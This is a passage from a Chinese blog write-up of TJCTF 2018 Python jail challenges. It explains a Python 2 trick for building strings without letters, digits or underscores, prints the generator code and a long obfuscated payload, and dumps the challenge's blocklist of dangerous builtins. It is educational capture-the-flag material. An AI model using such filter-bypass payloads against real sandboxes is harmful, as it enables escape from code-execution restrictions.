<!DOCTYPE html>
<html lang="zh-cn">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="TJCTF 2018 中两道 Python Jail 的解法"/><meta name="keywords" content="ctf, writeup, python, Aloxaf's blog" /><link rel="alternate" href="/atom.xml" title="Aloxaf's blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.svg?v=2.11.0" />
<link rel="canonical" href="https://www.aloxaf.com/2018/08/tjctf_pythonjail/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-123773630-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-123773630-1');
</script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":true};
</script>

    <title>TJCTF 2018 中两道 Python Jail 的解法 - Aloxaf's blog</title>
  <meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Aloxaf's blog" type="application/atom+xml">
</head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Aloxaf's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">首页
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">归档
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">标签
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">关于
          </li>
      </a><a href="/friends/">
        <li class="mobile-menu-item">友链
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Aloxaf's blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            首页
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            归档
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            标签
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            关于
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/friends/">
            友链
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">TJCTF 2018 中两道 Python Jail 的解法
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-08-11
        </span><span class="post-category">
            <a href="/categories/writeup/">writeup</a>
            </span>
        <span id="/2018/08/tjctf_pythonjail/" class="leancloud_visitors" data-flag-title="TJCTF 2018 中两道 Python Jail 的解法">
            <span class="leancloud-visitors-count" style="display: none;">0</span>
          </span>
        </div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">文章目录</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mirror-Mirror"><span class="toc-text">Mirror Mirror</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#我猜想的标准解法"><span class="toc-text">我猜想的标准解法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大概是官方没想到的解法"><span class="toc-text">大概是官方没想到的解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Abyss"><span class="toc-text">The Abyss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#下载"><span class="toc-text">下载</span></a></li></ol>
    </div>
  </div><div class="post-content"><p>感谢 M4x 师傅推荐了这个比赛, 虽然是面向美国高中生, 不过打了以后还是有点收获的.<br><del>同时内心受到一万点暴击伤害</del> </p>
<p>尤其是两道 Python jail, 非常硬却失挺.<br>(下载地址在文末)</p>
<a id="more"></a>

<h1 id="Mirror-Mirror"><a href="#Mirror-Mirror" class="headerlink" title="Mirror Mirror"></a>Mirror Mirror</h1><p>连进去以后会收到一个提示</p>
<blockquote>
<p>Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!</p>
</blockquote>
<p>不多说废话了, 这个环境无法 import, 也过滤了 双下划线, 和 getattr, eval, execfile, reload, file 等大量有用的函数,<br>经典的 payload 基本无法使用.</p>
<p>题目提示使用 <code>get_flag()</code>, 而且强调参数要包裹在两层括号中.<br>然而试一下会发现完全没有卵用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; get_flag(&#39;&quot;a&quot;&#39;)</span><br><span class="line">a is not a valid character</span><br><span class="line">&gt;&gt;&gt; get_flag(&#39;&quot;1&quot;&#39;)</span><br><span class="line">1 is not a valid character</span><br><span class="line">&gt;&gt;&gt; get_flag(&#39;&quot;[&quot;&#39;)</span><br><span class="line">You didn&#39;t guess the value of my super_secret_string</span><br><span class="line">&gt;&gt;&gt; get_flag(&#39;[&#39;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;console&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&#x2F;home&#x2F;app&#x2F;problem.py&quot;, line 23, in get_flag</span><br><span class="line">    if(eval(input) &#x3D;&#x3D; super_secret_string):</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1</span><br><span class="line">    [</span><br><span class="line">    ^</span><br><span class="line">SyntaxError: unexpected EOF while parsing</span><br></pre></td></tr></table></figure>

<h2 id="我猜想的标准解法"><a href="#我猜想的标准解法" class="headerlink" title="我猜想的标准解法"></a>我猜想的标准解法</h2><p> 通过 <code>get_flag.func_code.co_consts</code> 拿到函数内的常量, 得到 super_secret_string 的值.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_code.co_consts</span><br><span class="line">(<span class="literal">None</span>, <span class="string">'this_is_the_super_secret_string'</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>, <span class="number">44</span>, <span class="number">95</span>, <span class="string">' is not a valid character'</span>, <span class="string">'%\xcb'</span>, <span class="string">"You didn't guess the value of my super_secret_string"</span>)</span><br></pre></td></tr></table></figure>

<p>然后发现后面那一串数字代表的正好是 <code>09AZaz,_</code> 这几个字符,<br>于是判断过滤了 <code>0~9</code>, <code>A-Z</code> 和 <code>,</code> <code>_</code> 这两个字符.</p>
<p>再联想到题目让我们用两层括号和前面的报错, 判断应该是对我们的输入进行了eval, 那么具体思路就是:<br>不用 <code>0~9</code>, <code>A-Z</code> 和 <code>,</code> <code>_</code>  构造一个字符串 s, 使 <code>eval(s) == &#39;this_is_the_super_secret_string&#39;</code>.</p>
<p>实现的方法是个挺著名的技巧, Google 搜 python jail 就能很轻松地搜到.<br><a href="http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">plaidctf-pyjail-story-of-pythons-escape</a></p>
<p>简单地讲一下这篇文章讲了啥 (<strong>仅限Python2</strong>):</p>
<p>在 Python2 中, 利用 <code>[] &lt; []</code> 可以得到 False, <code>{} &lt; []</code> 可以得到 True (都是什么鬼). 再利用 True 和 False 在进行数学运算时表现类似 1 和 0 的特性, 就可以通过运算得到任意数字. 作者给出了一个脚本来进行这种转换. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>,</span><br><span class="line">                 <span class="string">"([]&lt;[])"</span>,  <span class="string">"(&#123;&#125;&lt;[])"</span>][nb+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb/<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>有了数字, 我们就可以利用 <code>&quot;%c&quot; % n</code> 这种方式来得到字符了,  不过这个地方 c 仍然是字母, 必须再想办法换掉.</p>
<p>作者提出了这种方式来获取 <code>%c</code> :   <code>`&#39;%\xcb&#39;`[1::3]</code> , 这是一个十分巧妙的方式. 首先 <code>&#39;%\xcb&#39;</code> 代表了两个字符, <code>%</code> 和 <code>\xcb</code> , 这两者都不在过滤列表内 ( 可以用 <code>[i for i in &quot;`&#39;%\xca&#39;`&quot;]</code>验证一下), 然后, 利用 ``(即repr的语法糖) 可以再次得到这串字符串的原始形式(相当于 eval 的反函数), 即由<code>&#39; % \ x c b &#39;</code> 七个字符组成的字符串. 现在再用下标将他们取出, 就能得到 <code>%c</code> 了, 然后就可以愉快地得到任意字符了.</p>
<p>接下来要把字符拼接成字符串, 对于本题来说我觉得直接 <code>+</code> 就可以了, 不过作者似乎对 repr 情有独钟, 采用了 <code>`[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;]`[2::5]</code> 这种方式来得到字符串 <code>abcd</code> …</p>
<p>这个地方我们用<code>+</code>拼接, 直接给出 payload 的生成代码. <span style="background-color: #555">应该没人打算手写吧</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+'</span>.join([<span class="string">"`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % "</span> + brainfuckize(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'this_is_the_super_secret_string'</span>])</span><br></pre></td></tr></table></figure>

<p>解释: 先用 <code>brainfuckize(ord(i))</code> 得到每个字符对应 ASCII 码的 brainfuck 形式. 再拼接在 <code>&quot;`&#39;%\xcb&#39;`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))] % &quot;</code> 后面, 就得到了一段 eval 后可以得到对应字符的代码, 然后把这一堆代码用<code>+</code> 拼接起来就可以得到最终 payload 了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~(((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(((~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))"</span></span><br></pre></td></tr></table></figure>

<p>把这堆不忍直视的玩意儿作为 get_flag 的参数传过去, 就能得到 flag 了</p>
<h2 id="大概是官方没想到的解法"><a href="#大概是官方没想到的解法" class="headerlink" title="大概是官方没想到的解法"></a>大概是官方没想到的解法</h2><p>我当时用的不是 <code>我猜想的标准解法</code> 那文章太硬核了看着就怕.</p>
<p>当时我是通过 <code>get_flag.func_gloabals</code>, 发现了一些有趣的东西</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> get_flag.func_globals</span><br><span class="line">&#123;'PseudoFile': &lt;class '__main__.PseudoFile'&gt;, 'code': &lt;module 'code' from '/usr/lib/python2.7/code.pyc'&gt;, 'bad': ['__class__', '__base__', '__subclasses__', '_module', 'open', 'eval', 'execfile', 'exec', 'type', 'lambda', 'getattr', 'setattr', '__', 'file', 'reload', 'compile', 'builtins', 'os', 'sys', 'system', 'vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], '__builtins__': &lt;module '?' (built-in)&gt;, '__file__': '/home/app/problem.py', 'execfile': &lt;built-in function execfile&gt;, '__package__': None, 'sys': &lt;module 'sys' (built-in)&gt;, 'getattr': &lt;built-in function getattr&gt;, 'Shell': &lt;class __main__.Shell at 0x7fa31706bc80&gt;, 'banned': ['vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], 'InteractiveConsole': &lt;class code.InteractiveConsole at 0x7fa31706bc18&gt;, 'eval': &lt;built-in function eval&gt;, 'get_flag': &lt;function get_flag at 0x7fa31707b8c0&gt;, '__name__': '__main__', 'main': &lt;function main at 0x7fa31708e410&gt;, '__doc__': None, 'print_function': _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 65536)&#125;</span><br></pre></td></tr></table></figure>

<p>加上 <code>.keys()</code> 可能更清晰</p>
